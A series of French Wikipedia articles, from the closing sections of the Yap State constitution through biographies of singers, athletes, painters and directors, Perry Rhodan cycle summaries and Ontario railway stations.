Section 5. L'État reconnaît les droits traditionnels et la propriété des ressources naturelles et de l'espace maritime de l'État [, à l'intérieur] et jusqu'à 12 miles de la ligne de base des îles. Aucune action ne peut être entreprise pour porter atteinte aux droits traditionnels et de propriété, à l'exception de celle que le gouvernement de l'État peut prévoir pour la conservation et [protection] des ressources naturelles dans l'espace maritime de l'État [, à l'intérieur] et jusqu'à 12 miles de la ligne de base des îles.
Section 6. Une pêche étrangère, de recherche ou un navire d'exploration ne doit pas prendre les ressources naturelles de toute zone au sein de l'espace maritime de l'État, sauf dans la mesure permise par les personnes appropriées exerçant les droits traditionnels et par la propriété et par la loi.
Article 14 : Dispositions générales.
"Les sections 1 et 2 ont été modifiées par un amendement constitutionnel adopté par les électeurs de l'État de Yap le 7 novembre 2006 et certifié par le commissaire aux élections de l'État de Yap le 24 novembre 2006. La modification de la section 1 a été défini dans la proposition de loi , D2 de la Convention constitutionnelle de Yap de 2004 et l'ajout de la section 10 dans la proposition de loi , D2. Les portions ôtées sont entre [crochets], celles rajoutées sont ."
Section 1. Colonia est la capitale de l'État, . L'Assemblée législative doit prévoir la désignation et la démarcation de la frontière de la capitale de l'État.
Section 2. Il doit y avoir un système de service civil pour le gouvernement de l'État, lequel doit être fondé sur des principes de mérite.
Section 3. Tous les agents publics, avant d'assumer les devoirs de leur charge, doivent prêter et souscrire le serment ou l'affirmation suivante : . Le législateur peut prescrire d'autres serments ou affirmations.
Section 4. Nul ne peut recevoir, utiliser, ou bénéficier d'un quelconque revenu du gouvernement, d'une propriété ou d'un service pour son compte ou son gain personnel, sauf dans la mesure permise par la loi.
Section 5. Les langues indigènes de l'État et l'anglais doivent être les langues officielles.
Section 6. Le sens de toute disposition de la présente Constitution doit être déterminé conformément à l'intention des délégués.
Section 7. Le peuple peut adopter, modifier ou abroger des lois par une initiative populaire. Une pétition d'initiative populaire doit contenir le texte intégral de la proposition de loi, la modification ou la loi à abroger et doit être signé par au moins vingt-cinq pour cent des électeurs inscrits de l'État. Une pétition d'initiative populaire doit être déposée auprès du procureur général pour sa certification. Une pétition d'initiative populaire certifiée par le procureur général doit être soumise aux électeurs lors de la prochaine élection générale et prend effet si elle est approuvée par une majorité des voix exprimées pour l'initiative.
Section 8. Un citoyen des États fédérés de Micronésie dont le domicile est dans l'État est un citoyen de l'État.
Section 9. Le gouverneur, le lieutenant-gouverneur ou un membre de l'Assemblée législative peut être révoqué par un rappel. Un rappel est déclenché par une pétition qui identifie le fonctionnaire qui est cherché à être rappelé par son nom et sa fonction, qui indique les motifs du rappel, et qui doit être signé par au moins vingt-cinq pour cent des personnes habilitées à voter pour le poste occupé par l'officiel. Une élection de rappel spéciale doit avoir lieu au plus tard soixante jours civils après le dépôt de la pétition de rappel. Un fonctionnaire ne doit être démis de ses fonctions qu'avec l'approbation d'une majorité des personnes qui votent à l'élection. Une pétition de rappel ne peut être déposée contre un fonctionnaire plus d'une fois par trimestre ou au cours de la première année d'un mandat.
Section 10. Les personnes à handicap mental doivent être hébergées dans les conditions prévues par la loi.
ARTICLE XV, Section 9. L'Assemblée législative doit adopter des traductions officielles de la présente Constitution.

</doc>
<doc id="8978247" url="https://fr.wikipedia.org/wiki?curid=8978247" title="Membrane basale épidermique">
Membrane basale épidermique



</doc>
<doc id="8978249" url="https://fr.wikipedia.org/wiki?curid=8978249" title="Calum Kennedy">
Calum Kennedy

Calum Kennedy (né Malcolm Martin Kennedy; - ) était un chanteur écossais.
Biographie.
Kennedy est né le à Lewis en Écosse, et a remporté une médaille d'or à la Mòd, en chantant en gaélique écossais. Son premier grand succès hors de l'Écosse était en remportant le Championnat du Monde de Ballade à Moscou en 1957.
Il avait sa propre émission de télévision, et a été élu "Personnalité TV Grampian de l'année». Il a été marié à une autre médaillé d'or Mod, Anne Gillies, qui est décédé en 1974. Il portait des tartans sur ses couvertures LP.
Son meilleur enregistrement a probablement été "Islands of Scotland" enregistré pour le label Decca Ace of Clubs dans les années 1960. Celui-ci contient une version de "Land o' Heart's Desire» parmi d'autres belles chansons en anglais.
La BBC produit un programme au début des années 1980 appelé "Calum Kennedy's Commando Course", qui a documenté (de façon comique, bien que c'était à l'origine involontaire) une tournée désastreuse autour de la Highlands dans un vieux bus. Comme de plus en plus de personnes du casting quitté la tournée, les affiches promotionnelles ont été barrés au marqueur rouge. Kennedy n'était pas heureux que programme ait été diffusé, il a estimé qu'il se moquait de lui, mais il est depuis passé à la postérité comme un morceau de la télévision classique.
Calum Kennedy est mort, âgé de 77 ans, à Aberdeen.
Vie privée.
La fille de Kennedy et Anne Gillies, Fiona Kennedy est également chanteuse et a été co-animatrice de la série pour enfants "Record Breakers" de la BBC au côté de Roy Castle. Sa petite-fille,Sophie Kennedy Clark, est mannequin et actrice.

</doc>
<doc id="8978253" url="https://fr.wikipedia.org/wiki?curid=8978253" title="Olympiades nationales">
Olympiades nationales

Les Olympiades nationales sont, en France, un ensemble de concours scientifiques au niveau académique et national et ouverts aux lycéens. D'un format plus libre que le Concours général, elles visent à sensibiliser les lycéens aux sciences et à récompenser les meilleurs d'entre eux.
Présentation.
Les Olympiades nationales se déclinent en cinq concours, de nature différente et s'adressant à des publics différents. Chaque concours donne lieu a un classement académique et national.
Ces concours, particulièrement celui de mathématiques, qui rassemble plus de vingt mille élèves chaque année, est très souvent couvert par la presse locale.
Comparaison avec les olympiades nationales d'autres pays.
En France, les olympiades nationales ont un format très différent de celui des olympiades internationales. Par exemple en mathématiques, elles concernent plus de et consistent en quatre exercices comportant le plus souvent des questions intermédiaires, ne demandant aucune connaissance en dehors du programme des classes de Première. À l'inverse, les olympiades de mathématiques des ne concernent que quelques centaines de candidats pré-sélectionnés par d'autres compétitions de niveau moins élevé, et sont d'un format et d'une difficulté assez proches de ceux des olympiades internationales de mathématiques. Il en va de même pour les , qui ne concernent que 1300 candidats chaque année, qui est de fait plus proche du Concours général en France.
Pour éviter la confusion avec l'Olympiade française de mathématiques, qui prépare et sélectionne directement les candidats aux olympiades internationales, les olympiades nationales sont également appelées « olympiades académiques ».

</doc>
<doc id="8978258" url="https://fr.wikipedia.org/wiki?curid=8978258" title="Liste des Perry Rhodan parus en France">
Liste des Perry Rhodan parus en France

Cette page présente la liste des romans de la série "Perry Rhodan" parus en France.
Cycle 1 - "La Troisième Force".
Résumé du cycle.
Lors de son alunissage avec la fusée Astrée, Perry Rhodan et Reginald Bull, officiers de l'U.S. Space Force, rencontrent des humanoïdes émissaires du Grand Empire d'Arkonis (dans l'amas M 13 de la constellation d'Hercule). Thora et Krest, en quête d'une mystérieuse Planète de Jouvence, ont fait naufrage sur notre satellite. Entré en possession de la super-technologie arkonide, Rhodan impose à la Terre une paix planétaire durable avec l'appui de mutant doués de facultés parapsychologiques.
Après avoir repoussé des envahisseurs extraterrestres, il se lance vers les étoiles. Il aide les autochtones du système de Véga à repousser les belliqueux Topsides. Remontant une longue chaîne d'indices, Rhodan et ses compagnons d'aventure – dont Krest et Thora – trouvent ensuite Delos, la planète errante, domaine de l'Immortel. Celui-ci accorde la douche cellulaire prolongatrice de vie à Perry Rhodan et d'autres terriens mais la refuse aux Arkonides, qui selon lui appartiennent au passé. Au cours de cette Quête Cosmique, un être étonnant s'allie aux humains : le mulot-castor L'Émir.
De retour sur Terre, Perry Rhodan doit se défendre contre le Surmutant Stafford Monterny. Puis des Marchands Galactiques, les Francs-Passeurs, attaquent le Système Solaire afin d'étouffer toute concurrence potentielle. Sous la pression des forces extraterrestres coalisées, Rhodan se voit contraint de faire croire, par un coup de bluff gigantesque, à la destruction pure et simple de la Terre.
Cycle 2 - "Atlan et Arkonis".
Résumé du cycle.
Profitant de la tranquillité ainsi obtenue, Perry Rhodan instaure l'Empire Solaire dont il tient les rênes sous le titre de Stellarque de Sol et dont les ressortissants prennent le nom générique de Terraniens. En 2040, apparaît Atlan, le Solitaire des Siècles, qui a passé la majeure partie des dix mille dernières années dans une base-refuge sous-marine. Arkonide comme Krest et Thora, Atlan jouit de la vie éternelle grâce à un activateur cellulaire transmis par l'Immortel de Délos. Au bout de duels très serrés, Rhodan et lui décident de s'accorder à jamais un soutien mutuel indéfectible. Par son rapport détaillé sur un lointain passé, Atlan fournit un éclairage insoupçonné sur tout un ensemble d'événements et d'interactions d'ampleur cosmique.
À la confrontation avec le Grand Coordinateur positronique qui règne sur l'Empire arkonide décadent s'ajoutent bientôt les attaques des Droufs qui, surgis d'un autre univers, tentent une invasion du continuum einsteinien. De plus, Perry Rhodan entre en conflit avec Thomas Cardif, le fils né de son union avec Thora l'Arkonide.
Reprogrammé en 2044, le Régent d'Arkonis reconnaît Atlan comme nouvel empereur sous le titre de Gnozal VIII. Les Droufs, peu après vaincus par les Arkonides, les Francs-Passeurs et les Terraniens coalisés, sont renvoyés à leur univers d'origine.
Alors que Thomas Cardif trahit la Terre au profit des Marchands Galactiques, Perry Rhodan perd son épouse, Thora, puis son fidèle ami Krest.
Cycle 3 - "Les Bioposis".
Résumé du cycle.
En 2102, à bord d'une frégate dotée d'un tout nouveau propulseur linéaire, Perry Rhodan échoue dans le système Bleu, enclos par un écran énergétique et domaine des orgueilleux Akonides, lointains ancêtres des Arkonides. Alors qu'éclatent de terribles antagonismes entre Akonides et Terraniens, d'innombrables mondes de la Voie Lactée sont contaminés par une drogue pernicieuse. Les Antis, prêtres fanatiques nantis de facultés anti-psi, manipulent Thomas Cardif qui usurpe incognito la place de son père avant d'être détruit par une ruse diabolique de l'Immortel de Délos. Perry Rhodan entre alors en possession d'un activateur cellulaire.
Le danger constitué par le Régent positronique d'Arkonis est définitivement écarté lorsqu'Atlan et quelques Terraniens, grâce à un saut temporel vers le passé, le mettent pour de bon hors d'état de nuire.
En 2112, en plein espace intergalactique, la race humaine plonge dans un conflit opposant les invisibles Laurins à un peuple de robots, les Bioposis. Un an plus tard, Perry Rhodan découvre le Monde-aux-Cent-Soleils, patrie de ces créatures mi-machines, mi-organiques, résout l'énigme posée par leur existence et les appuie pour vaincre les Laurins. Il fonde alors l'Alliance Galactique dont il devient le Grand Administrateur sous le titre de Stellarque de Sol.
Cycle 4 - "Le Deuxième Empire".
Résumé du cycle.
En deux cents ans de calme relatif, les Terraniens ont assis leur nouvelle position parmi les divers peuples galactiques. Perry Rhodan perd nombre de ses amis et proches collaborateurs qui ne reçoivent pas à temps l'un des vingt-cinq activateurs cellulaires éparpillés par l'Immortel à travers la Voie Lactée peu avant la disparition –voire l'anéantissement– de la planète Délos.
2326 voit surgir une nouvelle menace pour les explorateurs de la Galaxie : les monstrueux Annélicères. Sur la trace de ces énormes créatures, les hommes rencontrent les ressortissants d'un Deuxième Empire galactique, les Bleus qui occupent l'Est de la Voie Lactée, à l'opposé de Sol. Ces êtres au farouche désir d'expansion possèdent des vaisseaux quasi indestructibles grâce à leurs blindages de molkex. En 2328, des savants humains découvrent le moyen de détruire le molkex et cet atout met un terme définitif au conflit.
Durant cette période, de plus en plus de colonies terraniennes ont entrepris de lutter pour leur indépendance. Ainsi Plophos dont le dictateur, Iratio Hondro, fait enlever Perry Rhodan et quelques-uns de ses proches. Le Stellarque et ses compagnons ne sont sauvés qu'au bout d'une errance de près d'un an au voisinage du Centre galactique. Destitué, Hondro meurt après avoir attribué son activateur cellulaire à Mory Abro, qui devient la seconde épouse de Rhodan.
Cycle 5 - "Les Maîtres insulaires".
Résumé du cycle.
En 2400, à bord de sa nef amirale, le Krest II, et en compagnie du Halutien Icho Tolot, Perry Rhodan surgit au centre d'un réseau de transmetteurs de matière reliant le centre de la Voie Lactée à la Nébuleuse d'Andromède. À côté des pièges machiavéliques qui les attendent dans l'abîme intergalactique, les Terraniens se heurtent à de nouveaux adversaires, les Maahks (ou Méthaniens), dont une forteresse spatiale attaque bientôt la station régulatrice du transmetteur du cœur de notre Galaxie. Grâce à plusieurs opérations d'infiltration, l'invasion de la Voie Lactée organisée par les Maahks est évitée de justesse.
Dès 2402, les Terraniens parviennent à pénétrer davantage à l'intérieur d'Andromède en s'appuyant sur des têtes de pont établies dans les micronébuleuses voisines, AndroAlpha et Andorbéta. Ceux qui détiennent l'hégémonie sur Andromède apparaissent comme une poignée d'êtres auréolés de mystère, les Maîtres Insulaires. Tous les moyens leur sont propices pour neutraliser les Terraniens, y compris les manipulations temporelles. Le nouveau vaisseau-amiral de Rhodan, le Krest III, est ainsi projeté à plus de cinquante mille ans dans le passé : sur la Terre, l'Impérium de Lémuria se défend alors désespérément contre les belliqueux Halutiens. Effectuant le même plongeon mais perdant tout espoir de retour, la barge spatiale Dino-III et son équipage rendent possible le sauvetage du Krest III qui regagne enfin le temps présent.
Les tyrans d'Andormède focalisent leurs actions suivantes sur la Voie Lactée et contre l'Empire Solaire. En 2405, à la suite du pacte de paix conclu entre Terraniens et Maahks puis à la destruction de la route des transmetteurs reliant Andromède et la Galaxie, les Maîtres Insulaires sont éliminés les uns après les autres. C'est Atlan qui, finalement, remporte le duel décisif contre Faktor I, le Maître suprême —une femme habitée par une volonté de puissance hors du commun et qui avait au préalable réussi à le séduire.
 marque le début d'une accalmie de vingt-neuf ans au cours de laquelle Perry Rhodan et ses collaborateurs mettent tout en œuvre pour que l'Empire Solaire se relève des difficultés qu'il vient de traverser.
Cycle 6 - "M87".
Résumé du cycle.
Année 2435 : leur incursion involontaire dans le passé, au cours des péripéties précédentes, a attiré sur les Terraniens l'attention des Gardiens Fréquentiels ou Bi-Conditionnés, des policiers temporels dotés d'astronefs semi-organiques, les Dolans. Inflexibles et refusant toute argumentation, ils attaquent l'Empire Solaire... Avec son vaisseau amiral, un ultracroiseur de 2500 mètres de diamètre, Perry Rhodan subit l'effet d'une de leurs armes et est déporté à 32 millions d'années-lumière de la Voie Lactée, à l'intérieur de la galaxie géante M 87 que gouvernent les énigmatiques Constructeurs du Centre.
M 87 se révèle être la patrie des Bestians, ancêtres communs des Halutiens et des Bi-Conditionnés : créés par manipulations génétiques pour être les soldats de cette galaxie, ces être monstrueux et indomptable se sont révoltés il y a plus de 60 000 ans... Seuls quelques-uns d'entre eux ont réussi à fuir la contre-offensive des Constructeurs du Centre, certains atteignant la Voie Lactée —où ils ont donné naissance aux Halutiens— et d'autres s'installant dans les Nuages de Magellan —les Ulebs, ancêtres des Bi-Conditionnés. Développant une véritable paranoïa à l'idée que les Constructeurs pourraient tenter de les éradiquer en agissant sur le passé, ils ont développé tous les moyens imaginables pour faire échec à toute expérimentation temporelle et éliminer tous ceux qui oseraient de tells pratiques.
C'est dans ces deux petites galaxies naines que les Terraniens, en 2437, doivent porter leurs efforts pour mettre un terme à la menace. Mais la nouvelle vague d'assaut massif des Bi-Conditionnés contre la Terre, malgré les armes que celle-ci a héritées des anciens Lémuriens, n'est repousée que grâce à l'intervention lourde des Halutiens. Pire encore : une flotte des Constructeurs du Centre et de leurs mercenaires surgit soudain dans la Voie Lactée. certes, ils anéantissent les Ulebs grâce à leurs moyens technologiques, mais ils posent un ultimatum à l'Humanité : exterminer les Halutiens, qu'ils assimilent aux Bestians. Catégorique, Perry Rhodan refuse de trahir ses alliés et doit menacer de frapper sans merci pour renverser définitivement la situation devenue critique. Une fois les souverains de M 87 repartis pour leur galaxie-patrie, non sans avoir signé un traité de non agression, l'Empire Solaire et la Terre n'ont plus qu'à panser leurs blessures...

</doc>
<doc id="8978264" url="https://fr.wikipedia.org/wiki?curid=8978264" title="Liste des romans de Perry Rhodan">
Liste des romans de Perry Rhodan



</doc>
<doc id="8978272" url="https://fr.wikipedia.org/wiki?curid=8978272" title="Gare du Grand Tronc (Weston)">
Gare du Grand Tronc (Weston)

La Gare du Grand Trunk était une station de chemin de fer historique à Weston en Ontario. 
Histoire.
La station a été construite en 1856 par le chemin de fer du Grand Tronc reliant Chicago avec Montréal et Portland (Maine). Le Grand Tronc avait sa voie ferroviaire du nord-ouest à l'est, presque parallèle au chemin Weston. Heureusement pour les villageois, le chemin de fer inclut un arrêt à Weston, donnant un boom économique à la ville. En 1869, le chemin de fer Toronto, Grey et Bruce a commencé son service à Weston, ajoutant à la croissance du village.

</doc>
<doc id="8978273" url="https://fr.wikipedia.org/wiki?curid=8978273" title="John S. Herrington">
John S. Herrington

John Stewart Herrington, né le à Los Angeles (Californie), est un homme politique américain. Membre du Parti républicain, il est secrétaire à l'Énergie entre 1985 et 1989 dans l'administration du président Ronald Reagan.

</doc>
<doc id="8978275" url="https://fr.wikipedia.org/wiki?curid=8978275" title="Un amour oublié">
Un amour oublié

Un amour oublié ("") est un téléfilm américain réalisé par Anthony Harvey en 1994.
Synopsis.
les 2 anciens comédiens de cinéma des années 40 se sont fait des retrouvailles entre eux.

</doc>
<doc id="8978281" url="https://fr.wikipedia.org/wiki?curid=8978281" title="Chemin de fer Toronto, Grey et Bruce">
Chemin de fer Toronto, Grey et Bruce

Le chemin de fer Toronto, Grey et Bruce a été commencé en 1868 avec la construction d'une voie étroite de Toronto au Comté de Grey et le Comté de Bruce en Ontario, Canada.

</doc>
<doc id="8978287" url="https://fr.wikipedia.org/wiki?curid=8978287" title="Ed George">
Ed George

Ed George (né en 1946) est un joueur américain de football canadien et de football américain, membre du Temple de la renommée du football canadien.
Carrière.
Né à Norfolk en Virginie, Ed George a fréquenté la "E.C. Glass High School" à Lynchburg (Virginie), puis a joué au football universitaire au avant de transférer à l'université de Wake Forest pour laquelle il joue en 1968 et 1969. Au repêchage de la NFL de 1970, il est choisi par les Steelers de Pittsburgh au . Il préfère cependant se joindre aux Alouettes de Montréal de la Ligue canadienne de football. Il devient rapidement un pilier de la ligne offensive des Alouettes, méritant une nomination sur l'équipe d'étoiles de la division Est à chacune de ses cinq saisons (1970-1974), ainsi que sur l'équipe d'étoiles de la LCF pour les quatre dernières. Il est également récipiendaire du trophée Schenley comme meilleur joueur de ligne offensive de la LCF en 1974, en plus de remporter la coupe Grey avec les Alouettes en 1970 et 1974.
Durant la saison 1974, une dispute contractuelle éclate entre Ed George et la direction des Alouettes. George exigeait d'être compensé financièrement pour les deux parties ajoutées au calendrier de la LCF cette année-là (la saison passait de 14 à 16 matches). Aucune autre équipe canadienne n'a voulu acquérir le contrat de George, un des joueurs les mieux payés de la ligue.
En avril 1975, les Colts de Baltimore de la NFL acquièrent les droits sur George et celui-ci rejoint l'équipe pour la saison 1975. En septembre 1976, il passe aux Eagles de Philadelphie, avec lesquels il joue trois saisons, de 1976 à 1978. Puis il revient dans la LCF avec les Tiger-Cats de Hamilton et prend sa retraite en 1980.
Après-carrière.
Après sa carrière sportive, Ed George s'est orienté vers le monde des affaires. Il a dirigé l'agence de "Manning-Napier Financial Advisors" de Columbus en Ohio et il réside présentement à Scottsville en Virginie.

</doc>
<doc id="8978290" url="https://fr.wikipedia.org/wiki?curid=8978290" title="Gare du Grand Tronc (Hamilton)">
Gare du Grand Tronc (Hamilton)

La Gare du Grand Tronc était une station de chemin de fer historique à Hamilton (Ontario), qui était situé sur la rue Stuart, au début de la rue Caroline du Nord.
Histoire.
En 1885, un effort a été fait pour embellir la zone à l'est de la station elle-même avec les jardins d'ornement. Le remblai le long de la rue Stuart a été l'occasion pour permettre aux passagers en passant de savoir exactement en quelle ville ils se trouvaient, avec le mot «Hamilton» écrit avec des pierres blanches.
Michael Willson Browne, l'un des pionniers de l'industrie du transport maritime à Hamilton, a déménagé à Hamilton en 1836, et a conclu un partenariat avec Daniel Charles Gunn, qui a pris sa retraite en 1847. M. Browne est devenu directeur du bureau du chemin de fer du Grand Tronc à Hamilton en 1864.

</doc>
<doc id="8978292" url="https://fr.wikipedia.org/wiki?curid=8978292" title="Biruta Veldre">
Biruta Veldre

Biruta Veldre, née le à Riga en Lettonie, est une réalisatrice lettonne. 
Elle a fait ses études à l'Académie russe des arts du théâtre à Moscou en 1958-1965, puis, a complété ses études aux cours supérieurs des réalisateurs de 1970 à 1975. 
Elle débute comme assistant réalisateur pour les films de fiction en 1955. À partir de 1964, elle tourne les documentaires et les courts métrages ainsi que les épisodes des séries de communication télévisuelle "Māksla", "Padomju Latvija", "Sporta apskats", "Lauku hronika", "Latvijas hronika" entre 1984 et 1993. Sa carrière s'est déroulée à Riga Film Studio et à "Filmu Studija Trīs".
Elle est membre de l'Union cinématographique de Lettonie depuis 1978.
Le 17 novembre 2009, pour sa contribution au cinéma documentaire national Biruta Veldre fut fait chevalier de l'Ordre des Trois Étoiles par le président de Lettonie Valdis Zatlers.

</doc>
<doc id="8978298" url="https://fr.wikipedia.org/wiki?curid=8978298" title="Friedrich Preller l'Ancien">
Friedrich Preller l'Ancien

Friedrich Preller, dit l'Ancien, né à Eisenach le et mort à Weimar le , est un peintre et aquafortiste allemand.
À partir de 1844, il a été professeur à l'École princière libre de dessin de Weimar. Il a été particulièrement connu pour un cycle de seize fresques sur l’"Odyssée" aujourd'hui disparues.
Biographie.
Après ses études à l'école d'art de Weimar (1821), où il a plus tard été professeur et directeur, on l'a chargé de terminer des dessins de nuages de Goethe Celui-ci l'a envoyé poursuivre ses études à Dresde et s'est assuré qu'il reçoive des aides du grand-duc Charles-Auguste de Weimar. En 1824, Preller a accompagné le grand-duc dans un voyage aux Pays-Bas. Il a pu à cette occasion se perfectionner à l'Académie d'Anvers.
De 1827 à 1831, il a fait un long voyage d'étude en Italie. Le 23 mars 1832, lendemain de la mort de Goethe, il a été autorisé à dessiner le poète sur son lit de mort. En 1840, il a fait un voyage en Norvège, où il a réalisé une série d'œuvres encore visibles à Weimar aujourd'hui. Après son retour, en mai 1844, il a été nommé professeur à l'École princière libre de dessin de Weimar et peintre de cour. À l'exception d'un nouveau voyage en Italie de 1859 à 1861, il est resté une trentaine d'années dans cette école, dont il est devenu le directeur en 1868.
Il est mort à Weimar le 23 avril 1878, 2 jours avant son soixante-quatorzième anniversaire.
Il avait épousé en 1834 avec la fille d'un capitaine de Flensbourg, Marie Erichsen (1811–1862). De ce mariage sont issus trois fils : Ernst (1835–1925), Emil (1836–1893) et Friedrich Preller le Jeune (1838–1901), qui est entré à 13 ans dans l'atelier de son père et est lui-même devenu un peintre connu.
Outre Friedrich Preller l'Ancien et Friedrich Preller le Jeune, les peintres paysagistes Julius Preller (1834-1914), neveu de Friedrich l'Ancien, et Louis Preller (1822-1901), un parent éloigné, appartiennent à la "famille Preller allemande de peintres".
Œuvres.
De 1834 à 1836, Preller a peint six fresques à la détrempe illustrant l’"Odyssée" pour la Maison romaine de Leipzig. Celle-ci a été détruite en 1904, mais les fresques ont été replacées dans l'entrée de la bibliothèque de l'université de Leipzig, où elles ont survécu jusqu'en 1945 ; elle nous sont aujourd'hui connues par une série de cartes postales en couleur.
En 1836 et 1837, il a travaillé aux paysages des scènes d’"Oberon" de Christoph Martin Wieland pour la salle Wieland du palais grand-ducal. De 1836 à 1848, il a dirigé pour le grand-duc l'exécution de six fresques dans différents bâtiments de Thuringe. En Norvège en 1840 il a fait de la peinture de chevalet.
Après son retour d'Italie en 1861, il a terminé son cycle de fresques de l’"Odyssée", son œuvre la plus importante, qui l'a rendu célèbre. Outre ces fresques, il a réalisé beaucoup de de caractère classique-romantique. Vers la fin de sa vie, il s'est surtout consacré à des thèmes mythologiques.
Il a aussi été un aquafortiste à succès.

</doc>
<doc id="8978302" url="https://fr.wikipedia.org/wiki?curid=8978302" title="Rubén Amaro, Jr.">
Rubén Amaro, Jr.

Rubén Amaro, Jr. (né le à Philadelphie, Pennsylvanie, États-Unis) est un ancien joueur et dirigeant de baseball. Il est ensuite devenu instructeur.
Il évolue dans la Ligue majeure de baseball au poste de voltigeur de 1991 à 1996 pour les Angels de la Californie, les Phillies de Philadelphie et les Indians de Cleveland.
Il est directeur général des Phillies de Philadelphie de novembre 2008 à septembre 2015.
Carrière de joueur.
Rubén Amaro, Jr. est le fils de l'ancien joueur Rubén Amaro, Sr. et le petit-fils de Santos Amaro, joueur natif de Cuba qui a évolué en Ligue mexicaine de 1939 à 1955. Le jeune Amaro est "batboy" de 1980 à 1983, notamment à l'époque où son père est instructeur de premier but de l'équipe.
À l'université, Amaro joue pour le Cardinal de Stanford, avec qui il remporte en 1987 les College World Series. Il est en 1987 repêché au de sélection par les Angels de la Californie, l'équipe avec laquelle il fait en 1991 ses débuts dans le baseball majeur mais pour qui il ne dispute que 10 matchs. Le , les Angels échangent Amaro et le lanceur gaucher Kyle Abbott aux Phillies de Philadelphie contre le vétéran voltigeur Von Hayes.
Amaro fait deux séjours chez les Phillies : de 1992 à 1993, puis de 1996 à 1998. En , les Phillies l'échangent aux Indians de Cleveland contre le releveur droitier Heathcliff Slocumb. Amaro est préféré au vétéran joueur étoile Dave Winfield sur l'effectif des Indians qui participe en 1995 aux séries éliminatoires. Il obtient deux passages au bâton, qui se soldent par deux retraits, dans la Série mondiale 1995 perdue par les Indians aux mains des Braves d'Atlanta.
Rubén Amaro, Jr. a disputé seulement 485 matchs sur 8 saisons dans le baseball majeur. Il a disputé 126 et 117 matchs pour les Phillies au cours, respectivement, des saisons 1992 et 1997, mais a été essentiellement réserviste les autres années. Sa moyenne au bâton en carrière s'élève à ,235 grâce à 218 coups sûrs, dont 43 doubles, 9 triples et 16 circuits. Il compte 99 points marqués, 100 points produits et 15 buts volés. Les Amaro forment le seul duo père-fils à avoir porté les couleurs des Phillies, le plus âgé ayant joué à Philadelphie de 1960 à 1965.
Carrière de dirigeant.
Rubén Amaro, Jr. joint l'équipe de direction des Phillies de Philadelphie en 1998 comme assistant au directeur général. Engagé par Ed Wade, il épaule celui-ci pendant 7 saisons avant de passer 3 années comme assistant à Pat Gillick. En novembre 2008, quelques jours après la victoire des Phillies en Série mondiale, Gillick accepte le poste de président du club et cède le poste de directeur général, pour lequel il était sous contrat jusqu'au , à Amaro, qui cumule aussi les fonctions de vice-président senior. Amaro accepte un contrat initial d'une durée de 3 ans. Moins d'un an plus tard, le club remporte le championnat de la Ligue nationale mais perd en Série mondiale 2009. L'équipe, qui est alors à son zénith, aligne quelques autres bonnes saisons, une séquence qui culmine avec une saison 2011 de 102 victoires, la meilleure de l'histoire de la franchise. Mais le déclin survient rapidement : après 5 titres de division consécutifs, les Phillies passent de seulement 60 défaites en 2011 à 81 en 2012, puis 89 à chacune des deux années suivantes, pour se retrouver au dernier rang de leur section en 2014.
En , le contrat d'Amaro chez les Phillies est prolongé de 4 ans.
Amaro est critiqué pour avoir tardé à engager les Phillies dans un processus de reconstruction et est critiqué pour avoir haussé après la saison 2013 la moyenne d'âge des joueurs de son équipe alors que les performances des membres les plus âgés, davantage sujet aux blessures, déclinaient déjà rapidement. "Sporting News" classe Amaro sur 30 dans son palmarès des meilleurs directeurs-gérants des Ligues majeures en . Il est congédié par les Phillies le .
Carrière d'instructeur.
Le , Amaro est nommé instructeur de premier but des Red Sox de Boston, ce qui marque son retour sur le terrain pour la première fois depuis la fin de sa carrière de joueur.

</doc>
<doc id="8978312" url="https://fr.wikipedia.org/wiki?curid=8978312" title="Jean-François Rivard">
Jean-François Rivard

Jean-François Rivard est un scénariste et réalisateur québécois. Il est surtout connu pour avoir réalisé les séries télévisées "Les Invincibles" et "Série noire", coécrites avec François Létourneau.
Biographie.
Publicité.
Il a réalisé de nombreuses publicités québécoises notamment les publicités « Les fromages d'ici », pour Les producteurs de lait du Québec.
"Les Invincibles".
Au début des années 2000, il s'associe avec François Létourneau pour la scénarisation de la série télévisée "Les Invincibles". C'est lui qui assure la réalisation. Il tente d'incorporer de nombreuses références culturelles, majoritairement américaines dont les bandes dessinées de super-héros qui seront grandement présentes dans la série dont le nom est même inspiré. Les personnages de Carlos, Pierre-Antoine, Rémi et Steve seront associés à un super-héros ainsi que leurs conjointes dans la dernière saison. Il laisse aussi grande place à la musique notamment avec le personnage de Rémi qui est musicien. La trame sonore de la série est recherchée, notamment lors de la finale de la troisième saison avec la chanson du groupe Scorpions. S'inscrivant dans le genre dramatique, la série ne manque pas d'humour, reflétant à sa façon le début trentaine souvent assez maussade.
"Série noire".
Il s'associe de nouveau avec son ami François Létourneau pour le scénario d'une nouvelle production télévisuelle, "Série noire". Fidèle à ses habitudes, Rivard travaille sur une mise en scène efficace qui reflète bien l'esprit de la série. Comme dans "Les Invincibles", la musique occupe une grande place ainsi que les références à la culture québécoise et américaine, notamment "Le Déclin de l'empire américain".
Autres réalisations.
Il est réalisateur des captures de mouvement sur le jeu vidéo d'Ubisoft.

</doc>
<doc id="8978322" url="https://fr.wikipedia.org/wiki?curid=8978322" title="Paul Asciak">
Paul Asciak

Paul Asciak (Paolo Ascià pendant sa carrière italienne), né le à La Valette et mort dans la même ville le , était un ténor maltais.
Biographie.
Assez tôt, Paul Asciak montre des dispositions pour le chant dans la "Schola Cantorum" à l'église Saint-James à La Valette sous la direction de Carlo Diacono, l'un des plus grands compositeurs maltais.
Il a comme professeur le ténor maltais Nicolo Baldacchino avec qui il prend ses premières leçons de chant.
Carrière.
Paul Asciak fait ses débuts en 1946 au "Radio City Opera House" de Hamrun dans le rôle de Turiddu de Cavalleria rusticana de Pietro Mascagni. Il continue sa formation avec Luigi Cantoni.
En 1950, toujours au "Radio City Opera House", il est Radames dans Aida de Giuseppe Verdi avec la compagnie italienne d'opéra de passage à Malte, l'Impressa cantoni. La même année, il est invité en mars à chanter avec le ténor italien Tito Schipa et en mai avec la soprano italienne Maria Caniglia, tous deux de passage à Malte. Sur les conseils de Caniglia, il est encouragé à poursuivre ses études de chant à Rome, elle le recommande à Alberto Paoletti du "Teatro dell'Opera" de Rome.
